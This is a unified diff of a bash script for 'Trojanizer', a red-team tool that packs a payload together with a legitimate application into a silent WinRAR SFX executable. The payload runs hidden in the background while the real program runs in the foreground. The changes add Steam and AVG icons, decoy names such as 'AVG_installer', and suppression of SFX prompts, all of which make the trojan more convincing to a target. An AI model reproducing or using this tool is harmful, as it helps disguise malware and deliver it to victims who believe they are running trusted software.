@@ -86,14 +86,15 @@ cat << !
 -- Supported: Kali, Ubuntu, Parrot
 ---
 
-    The Trojanizer tool uses WinRAR (SFX) to compress the two files inputed by user,
+    The Trojanizer tool uses WinRAR (SFX) to compress the two files input by user,
     and transforms it into an SFX executable(.exe) archive. The sfx archive when
-    executed it will run both files (our payload and the legit appl inputed).
+    executed it will run both files (our payload and the legit appl at the same time).
 
     To make the archive less suspicious to target at execution time, trojanizer will
-    try to replace the default icon(.ico) of the sfx file with a user-selected one.
+    try to replace the default icon(.ico) of the sfx file with a user-selected one,
+    and supress all SFX archive sandbox msgs (Silent=1 | Overwrite=1).
 
-   'Trojanizer will not build real trojans, but from target perspective, it will replicate trojan behavior'
+   'Trojanizer will not build trojans, but from target perspective, it replicates the trojan behavior'
    (execute the payload in background, while the legit application executes in foreground).
 
 
@@ -108,9 +109,6 @@ cat << !
     3º - Run main tool
          sudo ./Trojanizer.sh
 
-
-    -- REPORT BUGS
-    https://github.com/r00t-3xp10it/trojanizer/issues
 !
    exit
     ;;
@@ -278,6 +276,7 @@ binary_path=$(zenity --title "☠ PAYLOAD TO BE COMPRESSED ☠" --filename=$IPAT
    Ext=`echo $Str | cut -d '.' -f2` > /dev/null 2>&1
    rm rep.log > /dev/null 2>&1
    if [ "$SIN_GL" = "ON" ]; then
+     pa_in="COMPATIBLE"
      echo "all extensions are allowed in 'single_file_execution'" > /dev/null 2>&1
    else
      #
@@ -303,7 +302,7 @@ else
   legit_path=$(zenity --title "☠ LEGIT APPLICATION TO TROJANIZE ☠" --filename=$IPATH --file-selection --text "chose legit application/agent") > /dev/null 2>&1
 fi
 N4m3=$(zenity --title="☠ Input SFX FILENAME ☠" --text "example: AVG_installer" --entry --width 300) > /dev/null 2>&1
-IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Windows-black.ico" FALSE "Windows-Metro.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
+IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Windows-black.ico" FALSE "Windows-Metro.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Steam-logo.ico" FALSE "AVG.ico" FALSE "Input your own icon" --width 330 --height 390) > /dev/null 2>&1
 # Input your own icon.ico ?
 if [ "$IcOn" = "Input your own icon" ]; then
   Icon_path=$(zenity --title "☠ INPUT YOUR OWN ICON (.ico) FILE ☠" --filename=$IPATH/bin --file-selection --text "chose the icon.ico to use ..") > /dev/null 2>&1
@@ -465,7 +464,7 @@ rm $IPATH/output/$ST_O > /dev/null 2>&1
 rm $IPATH/output/$ST_D > /dev/null 2>&1
 echo ${GreenF}[☆]${white}" Trojanizer : All tasks completed .."${Reset};
 zenity --info --title="☠ Trojanizer ☠" --text "Your sfx archive:\n'$IPATH/output/$N4m3.exe'" --width 380 > /dev/null 2>&1
-echo ${GreenF}[☆]${white}"Report bugs: https://github.com/r00t-3xp10it/trojanizer/issues"${Reset};
+echo ${GreenF}[☆]${white}" Report bugs${RedF}:${white} https://github.com/r00t-3xp10it/trojanizer/issues"${Reset};
 cd $IPATH
 exit
 
@@ -479,7 +478,7 @@ else
     #
     echo ""
     echo ${GreenF}[☆]${white} Trojanizer${RedF}::${white}v$VeR${RedF}::${white}SuspiciousShellActivity©${RedF}::${white}RedTeam${RedF}::${white}2017${Reset};
-    echo ${GreenF}[☆]${white}"Report bugs: https://github.com/r00t-3xp10it/trojanizer/issues"${Reset};
+    echo ${GreenF}[☆]${white}" Report bugs${RedF}:${white} https://github.com/r00t-3xp10it/trojanizer/issues"${Reset};
 exit
 fi
 
